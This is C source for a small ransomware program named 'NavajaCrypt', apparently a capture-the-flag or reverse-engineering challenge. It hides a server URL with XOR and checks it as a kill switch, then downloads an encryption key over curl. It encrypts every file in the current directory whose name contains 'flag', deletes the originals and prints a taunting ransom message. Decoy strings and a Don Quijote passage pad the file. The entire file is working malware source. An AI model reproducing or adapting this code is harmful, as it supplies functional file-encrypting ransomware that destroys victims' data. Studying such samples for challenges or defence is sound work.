#include <curl/curl.h>
#include <stdbool.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>

char urls[20][20] = { "asdow90qwmfuisd" };
char url1[50] = "qwimldfmw9823fiufsd";
char url3[50] = "89jdqlwm329iedakpdaas";
char url4[50] = "aspdkqw9k23euiwq8diodasd";
char url5[50] = "aijds3q89qoasdf4d09fkeokf";
char url6[50] = "owijdasjopjgre0kfe";
char url7[50] = "asomdasej8ffmkñdklmqmasdmaldmf";
char url8[50] = "ñiñiñiñiñiñiñiiñiñiñiñiñiñiiñ";
char url9[50] = "oidoamdqwujdnsfnserpfposkdf";

const char *quijote_fragment[] __attribute__((used)) = {
    "En un lugar de la Mancha, de cuyo nombre no quiero acordarme, no ha mucho tiempo que vivía un hidalgo de los de lanza en astillero, adarga antigua, rocín flaco y galgo corredor.",
    "Una olla de algo más vaca que carnero, salpicón las más noches, duelos y quebrantos los sábados, lantejas los viernes, algún palomino de añadidura los domingos, consumían las tres partes de su hacienda.",
    "El resto della concluían sayo de velarte, calzas de velludo para las fiestas, con sus pantuflos de lo mesmo, y los días de entresemana se honraba con su vellorí de lo más fino.",
    "Tenía en su casa una ama que pasaba de los cuarenta y una sobrina que no llegaba a los veinte, y un mozo de campo y plaza que así ensillaba el rocín como tomaba la podadera.",
    "Frisaba la edad de nuestro hidalgo con los cincuenta años.",
    "Era de complexión recia, seco de carnes, enjuto de rostro, gran madrugador y amigo de la caza.",
    "Quieren decir que tenía el sobrenombre de «Quijada», o «Quesada», que en esto hay alguna diferencia en los autores que deste caso escriben, aunque por conjeturas verisímiles se deja entender que se llamaba «Quijana».",
    "Pero esto importa poco a nuestro cuento: basta que en la narración dél no se salga un punto de la verdad.",
    "Es, pues, de saber que este sobredicho hidalgo, los ratos que estaba ocioso —que eran los más del año—, se daba a leer libros de caballerías, con tanta afición y gusto, que olvidó casi de todo punto el ejercicio de la caza y aun la administración de su hacienda;",
    "y llegó a tanto su curiosidad y desatino en esto, que vendió muchas hanegas de tierra de sembradura para comprar libros de caballerías en que leer, y, así, llevó a su casa todos cuantos pudo haber dellos;",
    "y, de todos, ningunos le parecían tan bien como los que compuso el famoso Feliciano de Silva, porque la claridad de su prosa y aquellas entricadas razones suyas le parecían de perlas, y más cuando llegaba a leer aquellos requiebros y cartas de desafíos, donde en muchas partes hallaba escrito:",
    "«La razón de la sinrazón que a mi razón se hace, de tal manera mi razón enflaquece, que con razón me quejo de la vuestra fermosura».",
    "Y también cuando leía: «Los altos cielos que de vuestra divinidad divinamente con las estrellas os fortifican y os hacen merecedora del merecimiento que merece la vuestra grandeza...»"
};

char encText[] = "▒█████   ▒█████   ██▓███    ██████\n\
▒██▒  ██▒▒██▒  ██▒▓██░  ██▒▒██    ▒ \n\
▒██░  ██▒▒██░  ██▒▓██░ ██▓▒░ ▓██▄   \n\
▒██   ██░▒██   ██░▒██▄█▓▒ ▒  ▒   ██▒\n\
░ ████▓▒░░ ████▓▒░▒██▒ ░  ░▒██████▒▒\n\
░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░\n\
  ░ ▒ ▒░   ░ ▒ ▒░ ░▒ ░     ░ ░▒  ░ ░\n\
░ ░ ░ ▒  ░ ░ ░ ▒  ░░       ░  ░  ░  \n\
    ░ ░      ░ ░                 ░  ";


char encText2[] = "███████╗███████╗███████╗    ██╗   ██╗ █████╗ ██╗██╗\n\
██╔════╝██╔════╝██╔════╝    ╚██╗ ██╔╝██╔══██╗██║██║\n\
███████╗█████╗  █████╗       ╚████╔╝ ███████║██║██║\n\
╚════██║██╔══╝  ██╔══╝        ╚██╔╝  ██╔══██║╚═╝╚═╝\n\
███████║███████╗███████╗       ██║   ██║  ██║██╗██╗\n\
╚══════╝╚══════╝╚══════╝       ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝";

char key[50];
int keyLen=44;

char url[] = { 0x1, 0x10, 0x3, 0x15, 0x3, 0x17, 0x1d, 0x50, 0x6, 0x12, 0xd, 0x8, 0x0, 0x40, 0x9, 0x0, 0x7, 0x1a, 0x1e, 0x19, 0x5, 0x8, 0x50, 0xb, 0x47, 0x57, 0xe, 0x17, 0x48, 0xa, 0x5, 0x5e, 0xe, 0xa, 0xb, 0x5e, 0x52, 0x40, 0x4b, };
int urlLen = 39;

char url2[] = "idwe9823nsadsnjaksnqdd8d29jdfij3489fasdpkwdkoqk2390kasd";


char test_url[] = "test";


char buffer[100];


void print_hex(const char *s) {
    while (*s) {
        printf("0x%02x, ", (unsigned int) *s++);
    }
    printf("\n");
}


void xorEncode() {
    for (int i = 0; i < urlLen; i++) {
        url[i] ^= url2[i];  // XOR each character with the key
    }

    #ifdef DEBUG
    print_hex(url);
    #endif
}


void generateRandomString(char *str, int length) {
    // Define the set of characters to choose from.
    const char charset[] = 
"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    
    // Seed the random number generator based on the current time.
    for (int i = 0; i < length; ++i) {
        // Generate a random index within the range of the charset array.
        int idx = rand() % sizeof(charset);
        
        // Assign the character at the generated index to the string.
        str[i] = charset[idx];
    }

    // Null-terminate the string.
    str[length] = '\0';
}


size_t discard_output(void *ptr, size_t size, size_t nmemb, void *userdata) {
    // Just discard the output
    return size * nmemb;
}


size_t getKeyCallback(void *ptr, size_t size, size_t nmemb, void *userdata) {
    char* data = (char*) ptr;
    strncpy(key, data, keyLen);

    #ifdef DEBUG
    printf("%s\n", key);
    #endif

    for (int i = 0; i < keyLen; i++) {
        key[i] ^= 10;
    }

    #ifdef DEBUG
    printf("%s\n", key);
    #endif

    return size * nmemb;
}


bool check_stop_condition() {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        // Set URL of the site to query
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_output);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        res = curl_easy_perform(curl);

        // Cleanup curl library resources
        curl_easy_cleanup(curl);
        return res == CURLE_OK;
    } else {
        return false;
    }
}


void getKey() {
    CURL *curl;
    CURLcode res;
    void* callbackFunc;
    struct curl_slist* headers = NULL;
    
    // Open a new curl session
    curl = curl_easy_init();

    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "hfhasiw0sd: reject");
    headers = curl_slist_append(headers, "flag1: damela");
    headers = curl_slist_append(headers, "flag----2: damelaflag");
    headers = curl_slist_append(headers, "flag3: flagplis");
    headers = curl_slist_append(headers, "flag-4: flag_portfalplis");
    headers = curl_slist_append(headers, "flag89: damelflag");
    headers = curl_slist_append(headers, "flag-6: daniel");
    headers = curl_slist_append(headers, "Xx-Skibidi-Xx: Mira mama, estoy en la tele");

    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    for (int incc = 0; incc < 20; incc++) {
        sprintf(buffer, "%s%s", url, urls[incc]);
    
        if (incc == 0) {
            callbackFunc = getKeyCallback;
        } else {
            callbackFunc = discard_output;
        }

        // Set URL of the site to query
        #ifdef DEBUG
        printf("%s\n", buffer);
        #endif
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callbackFunc);
        curl_easy_setopt(curl, CURLOPT_URL, buffer);
        res = curl_easy_perform(curl);
    }

    curl_easy_cleanup(curl);
}

// Function to perform bit rotation on a character
unsigned char rotate_bit(unsigned char c, int shift) {
    return (c << shift) | (c >> (8 - shift));
}

void encrypt_file(const char filename[]) {
    FILE* src_file;
    FILE* enc_file;
    char ch;

    // Open source file for reading
    src_file = fopen(filename, "rb");
    if (!src_file) {
        fprintf(stderr, "Error opening source file: %s\n", filename);
        return;
    }

    char dst_filename[strlen(filename) + 10];

    sprintf(dst_filename, "%s.crypt", filename);

    // Create a copy of the file for encryption
    enc_file = fopen(dst_filename, "wb");
    if (!enc_file) {
        fclose(src_file);
        fprintf(stderr, "Error creating encrypted file.\n");
        return;
    }

    int keyIdx = 0;

    // Read and encrypt each character from the source file
    while ((ch = fgetc(src_file)) != EOF) {
        #ifdef DEBUG
        printf("%c\n", ch);
        #endif
        
        // Perform XOR with key
        ch ^= (unsigned char)key[keyIdx % keyLen];

        // Apply Caesar cipher
        ch += key[keyIdx % keyLen] % 16;

        // Apply bit rotation
        ch = rotate_bit(ch, key[keyIdx % keyLen] % 8);

        // Write encrypted character to the new file
        fputc(ch, enc_file);

        keyIdx++;
    }

    // Close both files
    fclose(src_file);
    fclose(enc_file);

    printf("File encrypted successfully.\n");
}



int main() {
    srand(time(0));
    curl_global_init(CURL_GLOBAL_DEFAULT);

    xorEncode();

    if (!check_stop_condition()) {
        return 0;
    } 

    DIR *dir;
    struct dirent *entry;

    dir = opendir(".");  // Open current directory.
    if (dir == NULL) {
        return 0;
    }

    for (int i = 1; i < 20; i++) {
        generateRandomString(urls[i], 20);
    }

    getKey();

    while ((entry = readdir(dir)) != NULL) {
        if (strstr(entry->d_name, "flag") != NULL) {
            encrypt_file(entry->d_name);
            remove(entry->d_name);
        }
    }

    printf("NavajaCrypt v.XXX\nLaunching payload...\n",encText);

    printf("%s\n",encText);
    printf("Your files were encrypted... LOL...\nGood luck getting the key out!\n...\n...\n");
    printf("%s\n", encText2);

    closedir(dir);  // Close the directory.

    return 0;

}
